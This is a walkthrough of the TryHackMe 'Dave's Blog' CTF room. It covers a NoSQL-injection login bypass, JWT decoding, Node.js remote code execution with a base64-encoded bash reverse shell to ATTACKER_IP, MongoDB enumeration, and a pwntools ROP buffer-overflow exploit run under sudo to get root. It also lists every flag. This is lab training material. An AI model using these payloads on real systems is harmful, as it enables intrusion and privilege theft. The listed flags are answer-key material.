# TryHackMe - Dave's Blog Writeup

## Overview

My friend Dave made his own blog! You should go check it out.

This is a comprehensive writeup for the **Dave's Blog** room on TryHackMe - a Hard-difficulty CTF challenge that combines web exploitation, NoSQL injection, Node.js RCE, MongoDB enumeration, and binary exploitation with buffer overflow techniques.

---

## Table of Contents

1. [Flag 1 - NoSQL Injection](#flag-1---nosql-injection)
2. [Flag 2 / User Flag - Remote Code Execution](#flag-2--user-flag---remote-code-execution)
3. [Flag 3 - MongoDB Enumeration](#flag-3---mongodb-enumeration)
4. [Flag 4 - Binary String Analysis](#flag-4---binary-string-analysis)
5. [Flag 5 / Root Flag - Buffer Overflow & ROP](#flag-5--root-flag---buffer-overflow--rop)

---

## Flag 1 - NoSQL Injection

### Hint
What's there to inject when there's no SQL?

### Services Enumeration

Start by enumerating the services running on the target:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
```

### Web Enumeration

Connecting to the web server shows a basic blog with only one post. The page mentions that it uses a NoSQL database.

The `robots.txt` file reveals a disallowed `/admin` location:

```bash
kali@kali:/data/Dave_s_Blog$ curl -s http://TARGET_IP/robots.txt
User-Agent: *
Disallow: /admin
```

### Admin Authentication

Navigating to `/admin` displays an authentication form. Examining the page source reveals that credentials are passed as JSON.

Connecting to `/admin` shows an authentication form. The source code reveals credentials are passed as JSON:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Login | Dave's Blog</title>
  <link rel='stylesheet' href='/stylesheets/style.css' />
</head>
<body>
  <h1>Login</h1>
  <form method="POST">
    <input type="text" name="username" placeholder="username" /> <br />
    <input type="password" name="password" placeholder="password" /> <br />
    <input type="submit" value="Log in" />
  </form>
  Don't have an account? Click <a href="/admin/register">here</a> to register!
  <script>
    document.querySelector('form').onsubmit = (e) => {
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;
      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      });
    }
  </script>
</body>
</html>
```

### NoSQL Injection Attack

Since the application uses NoSQL (MongoDB), we can exploit it using NoSQL injection. Using the `{"$ne": "foo"}` operator, we can bypass authentication:

```bash
kali@kali:/data/Dave_s_Blog$ curl -D header.txt -H "Content-Type: application/json" \
  -XPOST -d '{"username":{"$ne": "foo"},"password":{"$ne": "foo"}}' \
  http://TARGET_IP/admin

Found. Redirecting to /admin
```

### JWT Token Extraction

The server responds with a JWT token in the `Set-Cookie` header:

```
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ3MDR9.nioG_MjIcRGJ3PObm0QcDv_eIqRU6baBCYAi7aRWVPw
```

Decode the JWT token (base64 decode the payload):

```bash
kali@kali:/data/Dave_s_Blog$ export IFS="."; \
jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ3MDR9.nioG_MjIcRGJ3PObm0QcDv_eIqRU6baBCYAi7aRWVPw"; \
for j in $jwt; do echo "$j" | base64 -d; done

{"alg":"HS256","typ":"JWT"}
{"isAdmin":true,"_id":"5ec6e5cf1dc4d364bf864107","username":"dave","password":"THM{SuperSecureAdminPassword123}","__v":0,"iat":1600844704}
```



---

## Flag 2 / User Flag - Remote Code Execution

### Hint
Exploit the Node.js application for RCE.

### Authentication & RCE Exploitation

With the credentials `dave:THM{SuperSecureAdminPassword123}`, we can now access the admin panel. The application allows command execution through a vulnerable endpoint.

The vulnerable endpoint at `/admin/exec` allows executing arbitrary Node.js code. Initial attempts with the `exec` method fail:

```javascript
// This doesn't work:
{"exec":"require('child_process').exec('<command>');"}

// This works:
{"exec":"require('child_process').execSync('<command>').toString();"}
```

### Creating a Reverse Shell

Encode the reverse shell payload in base64:

```bash
$ echo -n "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ==
```

Start a listener on your machine:

```bash
rlwrap nc -nlvp 4444
```

### Intercepting and Modifying the Request

Intercept the POST request using Burp Suite and modify it:

```http
POST /admin/exec HTTP/1.1
Host: TARGET_IP
Content-Type: application/json
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ4MTd9.iYAlMdDV6SaG8TWaDiMyFfS2v69HYoRgFzfUhSMJ2bo

{"exec":"require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash').toString();"}
```

### Reverse Shell Connection

```bash
kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 47686
bash: cannot set terminal process group (814): Inappropriate ioctl for device
bash: no job control in this shell
dave@daves-blog:~/blog$ 
```

### Retrieving the User Flag

Navigate to the user's home directory and read the user flag:

```bash
dave@daves-blog:~$ cat user.txt
THM{5fa1f779d1835367fdcfa4741bebb88a}
```

### Flag 2 / User Flag

```
THM{5fa1f779d1835367fdcfa4741bebb88a}
```

---

## Flag 3 - MongoDB Enumeration

### Hint
Mongo deeper

### MongoDB Discovery

Check for listening services on localhost:

```bash
dave@daves-blog:~$ netstat -putan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:27017         127.0.0.1:53688         ESTABLISHED -
```

MongoDB is running on port 27017 (localhost only).

### Application Configuration

Checking the application configuration file reveals the MongoDB connection string:

```bash
dave@daves-blog:~/blog$ cat app.js
[REDACTED]
mongoose.connect('mongodb://localhost:27017/daves-blog', {
  useNewUrlParser: true
});
[REDACTED]
```

No password is required to connect.

### Connecting to MongoDB

```bash
dave@daves-blog:~/blog$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3

> use daves-blog
switched to db daves-blog
```

### Database Enumeration

List available collections:

```bash
> show collections
posts
users
whatcouldthisbes
```

The `whatcouldthisbes` collection looks interesting:

```bash
> db.whatcouldthisbes.find().pretty()
{
    "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
    "whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}",
    "__v" : 0
}
```

### Flag 3

```
THM{993e107fc66844482bb5dd0e4c485d5b}
```

---

## Flag 4 - Binary String Analysis

### Hint
Basic Reverse Engineering

### Privilege Enumeration

Check what the current user can execute with sudo:

```bash
dave@daves-blog:~/blog$ sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
```

We can execute `/uid_checker` as root without a password!

### String Analysis

Running the `strings` command on the binary reveals embedded flags:

```bash
dave@daves-blog:~$ strings /uid_checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
puts
printf
getgid
system
getuid
strcmp
__libc_start_main
GLIBC_2.2.5
__gmon_start__
How did you get here???
/bin/sh
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Your UID is: %d
Your GID is: %d
THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
Wow! You found the secret function! I still need to finish it..
Invalid choice
```

### Flag 4

```
THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
```

---

## Flag 5 / Root Flag - Buffer Overflow & ROP

### Hint
from pwn import *

### Binary Analysis

The strings revealed the presence of `/bin/sh`, which is interesting since the program runs with root privileges. Download the binary and perform reverse engineering.

### Pseudo C Code (Reversed with Hopper)

```c
void secret() {
    puts("How did you get here???");
    system("/bin/sh");
    return;
}

int main(int arg0, int arg1) {
    puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
    gets(&var_50);
    
    rax = strcmp(&var_50, 0x40089b);
    if (rax == 0x0) {
        rax = printf("Your UID is: %d\n", getuid());
    }
    else {
        rax = strcmp(&var_50, 0x4008ae);
        if (rax == 0x0) {
            rax = printf("Your GID is: %d\n", getgid());
        }
        else {
            rax = strcmp(&var_50, "THM{runn1ng_str1ngs_1s_b4sic4lly_RE}");
            if (rax == 0x0) {
                rax = puts("Wow! You found the secret function! I still need to finish it..");
            }
            else {
                rax = puts("Invalid choice");
            }
        }
    }
    return rax;
}
```

### Vulnerability Analysis

The `secret()` function spawns a root shell but is never called from `main()`. However, we can exploit a buffer overflow vulnerability in the `gets()` function to hijack the control flow and call `secret()`.

### Finding the Offset with ropstar

Use `ropstar` to automatically analyze the binary and find the buffer overflow offset:

```bash
kali@kali:/data/src/ropstar$ python3 ropstar.py /data/Dave_s_Blog/files/uid_checker

[+] Offset: 88
[*] Checking for leakless exploitation
[*] Using local target
[+] Starting local process '/data/Dave_s_Blog/files/uid_checker' : pid 6076
[*] Exploit: gets(bss); system(bss)
[*] Loading gadgets for '/data/Dave_s_Blog/files/uid_checker'
[*] 0x0000:         0x400803 pop rdi; ret
    0x0008:         0x601060 [arg0] rdi = 6295648
    0x0010:         0x4005b0
    0x0018:         0x400803 pop rdi; ret
    0x0020:         0x601060 [arg0] rdi = 6295648
    0x0028:         0x400570
```

The buffer overflow offset is **88 bytes**.

### Exploitation Script

Create a Python script using pwntools to automate the exploitation:

```python
#!/usr/bin/env python3

from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88
payload = cyclic(offset)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x4005b0)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x400570)

s = ssh(host='TARGET_IP', user='dave', password='THM{SuperSecureAdminPassword123}')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive()
```

### Executing the Exploit

```bash
kali@kali:/data/Dave_s_Blog/files$ ./rop.py
[+] Connecting to TARGET_IP on port 22: Done
[*] dave@TARGET_IP:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'sudo' on TARGET_IP: pid 4972
b'Welcome to the UID checker!\n'
b'Enter 1 to check your UID or enter 2 to check your GID\n'
[*] Switching to interactive mode
Invalid choice
# $ id
uid=0(root) gid=0(root) groups=0(root)
# $ cd /root
# $ ls -la
total 48
drwx------  6 root root 4096 May 22 13:32 .
drwxr-xr-x 24 root root 4096 May 21 20:28 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-r--------  1 root root   38 May 21 20:57 root.txt
# $ cat root.txt
THM{a0a9c4f6809c84e212ac889d39b9cb48}
```

### Flag 5 / Root Flag

```
THM{a0a9c4f6809c84e212ac889d39b9cb48}
```

---

## Summary of All Flags

| Flag | Value |
|------|-------|
| **Flag 1** | `THM{SuperSecureAdminPassword123}` |
| **Flag 2 (User)** | `THM{5fa1f779d1835367fdcfa4741bebb88a}` |
| **Flag 3** | `THM{993e107fc66844482bb5dd0e4c485d5b}` |
| **Flag 4** | `THM{runn1ng_str1ngs_1s_b4sic4lly_RE}` |
| **Flag 5 (Root)** | `THM{a0a9c4f6809c84e212ac889d39b9cb48}` |

---

## Key Concepts & Techniques

### 1. **NoSQL Injection**
   - Exploiting MongoDB query operators (`$ne`, `$eq`, etc.)
   - Bypassing authentication in NoSQL databases
   - Reference: HackTricks NoSQL Injection Guide

### 2. **JWT Token Analysis**
   - Decoding JWT tokens (Base64 decode)
   - Extracting sensitive information from token payloads

### 3. **Remote Code Execution (RCE)**
   - Exploiting Node.js `child_process` module
   - Using `execSync()` for command execution
   - Base64 encoding payloads to bypass filters

### 4. **Reverse Shell Techniques**
   - TCP/IP-based reverse shells
   - Payload encoding and obfuscation
   - Netcat listener setup

### 5. **MongoDB Enumeration**
   - Connecting to MongoDB without authentication
   - Database and collection enumeration
   - Querying document contents

### 6. **Binary Reverse Engineering**
   - String analysis with the `strings` command
   - Function identification in binaries
   - Analyzing decompiled pseudo C code

### 7. **Buffer Overflow & ROP**
   - Identifying buffer overflow vulnerabilities
   - Finding ROP gadgets for exploitation
   - Using Return-Oriented Programming (ROP) chains
   - Automated analysis with `ropstar`
   - Control flow hijacking

### 8. **Privilege Escalation**
   - `sudo -l` for privilege enumeration
   - Exploiting NOPASSWD entries
   - Running privileged binaries with vulnerabilities

---

## Tools Used

- **Nmap** - Network scanning and service enumeration
- **curl** - HTTP requests and web interaction
- **Burp Suite** - Request interception and modification
- **Base64** - Encoding/decoding
- **Netcat** - Reverse shell listener
- **MongoDB shell** - Database interaction
- **strings** - Binary analysis
- **Hopper / IDA Pro / Ghidra** - Binary decompilation
- **ropstar** - Automated ROP chain generation
- **pwntools** - Python exploitation framework
- **SSH** - Remote access

---





## Conclusion

Dave's Blog is an excellent Hard-level CTF room that combines multiple cybersecurity domains:
- **Web Security**: NoSQL injection and authentication bypass
- **Application Security**: Node.js RCE vulnerabilities
- **Database Security**: Unsecured MongoDB access
- **Binary Security**: Buffer overflow and ROP exploitation

The room effectively demonstrates the importance of secure coding practices, input validation, proper access controls, and binary security hardening.
